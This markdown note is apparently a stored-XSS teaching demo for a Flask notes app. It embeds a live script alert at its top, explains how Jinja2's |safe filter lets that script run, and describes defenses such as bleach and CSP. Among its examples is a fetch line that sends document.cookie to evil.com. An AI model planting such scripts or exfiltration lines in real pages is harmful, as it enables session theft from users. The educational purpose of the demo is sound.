# XSS Test 1 — Simple Alert

If an alert box popped up when this page loaded, congratulations — a Stored XSS attack just executed successfully.

<script>alert('XSS Vulnerability Found!\n\nThis script was embedded inside a markdown note.\nIt ran because of the |safe filter in view.html.')</script>

---

## So what just happened?

This page comes from a markdown file. It's supposed to be plain text — notes, paragraphs, maybe some bold words. But buried inside that text, there's this line:

```
<script>alert('XSS Vulnerability Found!')</script>
```

That shouldn't have worked. In any decent notes application, user-submitted content should render as **text only**, never as executable code. But here it did. And understanding why means tracing through every step of how this page got from a file on disk to what's currently on screen.

## The attack chain, step by step

**1. The file gets saved to the database.** The import script reads this markdown file and dumps the entire content into the database. Every character, every tag, no questions asked. There's no filtering, no sanitization, no validation. Whatever's in the file goes straight into the `content` column. A `<script>` tag is treated the same as a paragraph about the weather.

**2. A user opens the note.** When someone navigates to this note, Flask's `view_note` function pulls the content from the database and hands it to Python's `markdown` library. That library converts markdown syntax to HTML — headings become `<h1>` tags, bold text becomes `<strong>`, and so on. But here's the thing: the markdown spec allows inline HTML. So when the library encounters a `<script>` tag, it doesn't strip it or escape it. It just leaves it alone and passes it through to the output as-is.

**3. The template renders the content.** This is where it all falls apart. In `view.html`, the content is rendered like this:

```
{{ content|safe }}
```

Jinja2, the template engine, normally auto-escapes everything. That means if there's a `<script>` tag in the output, it gets converted to `&lt;script&gt;` — which shows up as plain text on the page and never executes. It's a solid default protection. But the `|safe` filter disables it entirely. It tells Jinja2: "this content is trusted, don't touch it." Why was it added? Because the markdown-to-HTML conversion produces legitimate HTML — headings, paragraphs, links, lists — and those need to render properly. Without `|safe`, every `<h1>` would show up as literal text instead of an actual heading. The problem is that `|safe` can't tell the difference between a harmless `<h1>` and a malicious `<script>`. It lets everything through.

**4. The browser does what browsers do.** The browser parses the HTML top to bottom. When it hits a `<script>` tag, it stops rendering and immediately executes the JavaScript inside. `alert()` throws a popup box on screen. No delay, no confirmation, no permission needed.

## Why this matters

Right now it's just an innocent alert box. Annoying, harmless. But that `alert()` could have been anything:

- `document.cookie` — stealing session tokens and login credentials
- `document.body.innerHTML = '...'` — replacing the entire page with fake content
- A phishing form that looks like a legitimate login prompt, capturing passwords
- `fetch('https://evil.com/steal?data=' + document.cookie)` — silently sending user data to an external server
- A keylogger that records every keystroke on the page

And the worst part: this is a **Stored XSS** attack. The payload lives in the database. It was written once, but it fires every single time someone opens this note. Every user, every visit, automatically. There's no need for the attacker to trick someone into clicking a special link — just opening the note is enough.

## How this could have been prevented

Breaking any single link in the chain would stop the attack:

- **Sanitize on input:** Strip or escape HTML tags before saving to the database. If a `<script>` tag never makes it into storage, it can never execute.
- **Sanitize on output:** Instead of raw `|safe`, use a library like `bleach` to whitelist only safe tags (`<h1>`, `<p>`, `<strong>`, `<a>`, `<code>`) and strip everything dangerous (`<script>`, `<iframe>`, `<img onerror>`). The markdown formatting still works, but the attack payloads get cleaned out.
- **Drop the `|safe` filter:** Using plain `{{ content }}` would auto-escape everything. But this breaks markdown rendering too, so it's not ideal on its own.
- **Content-Security-Policy header:** Adding a CSP header that blocks inline scripts (`script-src 'self'`) would prevent the browser from executing any `<script>` tag that's embedded directly in the page. Even if the payload makes it all the way to the HTML, the browser refuses to run it.

The real answer is doing all of these together. In security, relying on a single layer of defense is asking for trouble. Stack them up — sanitize the input, sanitize the output, set the right headers. That's what "defense in depth" means.
